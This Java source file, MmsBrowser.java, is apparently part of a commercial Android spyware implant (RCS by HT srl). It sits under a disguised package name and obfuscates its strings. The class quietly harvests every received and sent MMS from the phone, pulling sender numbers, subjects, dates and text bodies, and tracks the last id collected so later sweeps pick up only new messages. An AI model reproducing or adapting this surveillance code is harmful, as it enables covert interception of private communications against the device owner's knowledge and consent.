/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : MmsBrowser.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.module.message;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.text.MessageFormat;
import java.util.ArrayList;

import android.database.Cursor;
import android.net.Uri;

import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;
import com.android.m.M;

public class MmsBrowser {
	private static final String TAG = "MmsBrowser"; //$NON-NLS-1$

	private final ArrayList<Mms> list;
	int maxId = 0;

	public MmsBrowser() {
		list = new ArrayList<Mms>();
	}

	// gets mms with id > minId
	public ArrayList<Mms> getMmsList(int lastParsedId) {
		maxId = lastParsedId;

		list.clear();

		// content://mms/inbox
		parse(M.d("content://mms/inbox"), Mms.RECEIVED, lastParsedId); //$NON-NLS-1$
		// content://mms/sent
		parse(M.d("content://mms/sent"), Mms.SENT, lastParsedId); //$NON-NLS-1$

		return list;
	}

	private void parse(String content, boolean sentState, int lastManagedId) {
		// 13.2=address
		// 13.3=contact_id
		// 13.4=charset
		final String[] projection = new String[] {
				M.d("address"), M.d("contact_id"), M.d("charset"), M.d("type") }; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
		// 13.5=type
		// 13.6=137
		final String selection = M.d("type") + "=" + M.d("137"); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$

		final Cursor c = Status.getAppContext().getContentResolver().query(Uri.parse(content), null, null, null, null);

		final int mmsEntriesCount = c.getCount();

		if (c.moveToFirst() == false) {
			c.close();
			return;
		}

		for (int i = 0; i < mmsEntriesCount; i++) {
			String subject, number, body = null;
			long date;
			boolean sentStatus;
			int intId;

			try {
				// 13.10=_id
				final String id = c.getString(c.getColumnIndex(M.d("_id"))); //$NON-NLS-1$
				intId = Integer.parseInt(id);
				maxId = Math.max(maxId, intId);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): id = " + id); //$NON-NLS-1$
				}

				if (intId <= lastManagedId) {
					continue;
				}

				// printColumnMms(c);
				// 13.8=sub
				subject = c.getString(c.getColumnIndex(M.d("sub"))); //$NON-NLS-1$
				// 13.9=date
				String dateString = c.getString(c.getColumnIndex(M.d("date"))).toString(); //$NON-NLS-1$
				date = Long.parseLong(dateString) * 1000; //$NON-NLS-1$

				number = extractNumber(id, projection, selection);
				body = extractBody(id);

				sentStatus = sentState;
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
				c.close();
				return;
			}

			final Mms m = new Mms(intId, number, subject, date, sentStatus, body);

			c.moveToNext();
			list.add(m);
		}
	}

	private String extractNumber(String id, String[] projection, String selection) {
		// number
		// 13.11=content://mms
		final Uri.Builder builder = Uri.parse(M.d("content://mms")).buildUpon(); //$NON-NLS-1$
		// 13.12=addr
		builder.appendPath(String.valueOf(id)).appendPath(M.d("addr")); //$NON-NLS-1$

		Cursor cursor1 = Status.getAppContext().getContentResolver()
				.query(builder.build(), projection, selection, null, null);

		String number;
		if (cursor1.moveToFirst() == true) {
			number = cursor1.getString(0);
			// 13.13=insert-address-token
			if (M.d("insert-address-token").equals(number)) { //$NON-NLS-1$
				number = getAddressNumber(id);
			}
		} else {
			number = ""; //$NON-NLS-1$
		}

		cursor1.close();
		cursor1 = null;

		return number;
	}

	private String extractBody(String id) {
		// multipart
		String selectionPart = "mid=" + id; //$NON-NLS-1$
		Uri uri = Uri.parse(M.d("content://mms/part")); //$NON-NLS-1$
		Cursor cursor = Status.getAppContext().getContentResolver().query(uri, null, selectionPart, null, null);
		String body = null;
		if (cursor.moveToFirst()) {
			do {
				String partId = cursor.getString(cursor.getColumnIndex("_id")); //$NON-NLS-1$
				String type = cursor.getString(cursor.getColumnIndex(M.d("ct"))); //$NON-NLS-1$
				if (M.d("text/plain").equals(type)) { //$NON-NLS-1$
					String data = cursor.getString(cursor.getColumnIndex(M.d("_data"))); //$NON-NLS-1$

					if (data != null) {
						// implementation of this method below
						body = getMmsText(partId);
					} else {
						body = cursor.getString(cursor.getColumnIndex(M.d("text"))); //$NON-NLS-1$
					}
				}
			} while (cursor.moveToNext());
		}
		cursor.close();
		return body;
	}

	private void printColumnMms(final Cursor c) {
		for (int j = 0; j < c.getColumnCount(); j++) {
			final String name = c.getColumnName(j);
			final String value = c.getString(c.getColumnIndex(name));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse): " + name + " = " + value);//$NON-NLS-1$ //$NON-NLS-2$
			}
		}
	}

	private String getMmsText(String partId) {
		Uri partURI = Uri.parse(M.d("content://mms/part/") + partId); //$NON-NLS-1$
		InputStream is = null;
		StringBuilder sb = new StringBuilder();
		try {
			is = Status.getAppContext().getContentResolver().openInputStream(partURI);
			if (is != null) {
				InputStreamReader isr = new InputStreamReader(is, M.d("UTF-8")); //$NON-NLS-1$
				BufferedReader reader = new BufferedReader(isr);
				String temp = reader.readLine();
				while (temp != null) {
					sb.append(temp);
					temp = reader.readLine();
				}
			}
		} catch (IOException e) {
		} finally {
			if (is != null) {
				try {
					is.close();
				} catch (IOException e) {
				}
			}
		}
		return sb.toString();
	}

	private String getAddressNumber(String id) {
		String selectionAdd = new String(M.d("msg_id")+"=" + id); //$NON-NLS-1$
		String uriStr = MessageFormat.format(M.d("content://mms/{0}/addr"), id); //$NON-NLS-1$
		Uri uriAddress = Uri.parse(uriStr);
		Cursor cAdd = Status.getAppContext().getContentResolver().query(uriAddress, null, selectionAdd, null, null);
		String name = null;
		if (cAdd.moveToFirst()) {
			do {
				String number = cAdd.getString(cAdd.getColumnIndex(M.d("address"))); //$NON-NLS-1$
				if (!M.d("insert-address-token").equals(number) && number != null) { //$NON-NLS-1$
					name = number;
				}
			} while (cAdd.moveToNext());
		}
		if (cAdd != null) {
			cAdd.close();
		}
		return name;
	}

	public int getMaxId() {
		return maxId;
	}
}
